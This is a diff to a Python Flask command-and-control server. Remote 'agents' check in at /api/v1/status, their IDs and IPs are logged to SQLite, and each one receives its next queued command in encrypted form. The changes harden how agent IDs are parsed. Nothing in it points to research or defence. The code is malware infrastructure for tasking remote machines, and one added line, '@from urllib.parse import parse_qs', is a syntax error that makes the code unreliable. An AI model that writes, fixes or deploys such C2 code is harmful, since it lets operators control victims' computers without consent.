@@ -42,31 +42,35 @@ def encrypt_data(data):
 
 # --- AGENT COMMAND & CONTROL ---
 
+@from urllib.parse import parse_qs
+
 @app.route('/api/v1/status', methods=['POST'])
 def status():
     try:
         ip = request.headers.getlist("X-Forwarded-For")[0] if request.headers.getlist("X-Forwarded-For") else request.remote_addr
         
-        # 1. Try to get JSON first, then Form, then fallback to raw parsing
-        data = request.get_json(silent=True)
-        if data:
-            agent_id = data.get('pc')
+        # 1. Try to get the Agent ID from JSON or Form data first
+        agent_id = None
+        if request.is_json:
+            agent_id = request.get_json().get('pc')
         else:
             agent_id = request.form.get('pc')
 
-        # 2. Manual fallback for raw string (id=...&pc=...)
+        # 2. If it's a raw string that isn't formatted as a standard form
         if not agent_id:
             raw_payload = request.get_data().decode()
-            params = dict(x.split('=') for x in raw_payload.split('&') if '=' in x)
-            agent_id = params.get('pc', 'Unknown')
+            # Use parse_qs instead of manual splitting to avoid the 'length 3' error
+            params = parse_qs(raw_payload)
+            # parse_qs returns lists, so we get the first item
+            agent_id = params.get('pc', ['Unknown'])[0]
 
-        # 3. Save to Database
+        # 3. Database Update
         conn = sqlite3.connect(DB_PATH)
         c = conn.cursor()
         c.execute("REPLACE INTO agents (id, last_seen, info, remote_ip) VALUES (?, ?, ?, ?)",
                   (agent_id, time.strftime("%H:%M:%S"), "Active", ip))
         
-        # 4. Check for tasks
+        # 4. Task Management
         c.execute("SELECT id, command FROM tasks WHERE agent_id = ? ORDER BY id ASC LIMIT 1", (agent_id,))
         task = c.fetchone()
         
@@ -80,8 +84,9 @@ def status():
         conn.commit()
         conn.close()
         return encrypt_data("IDLE")
+
     except Exception as e:
-        print(f"Error in status: {e}") # This helps you see errors in Render logs
+        print(f"Error in status: {e}") # This will show up in your Render logs
         return encrypt_data("IDLE")
 
 @app.route('/api/v1/results', methods=['POST'])
@@ -150,4 +155,5 @@ def add_task():
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 10000))
     app.run(host='0.0.0.0', port=port)
+
 
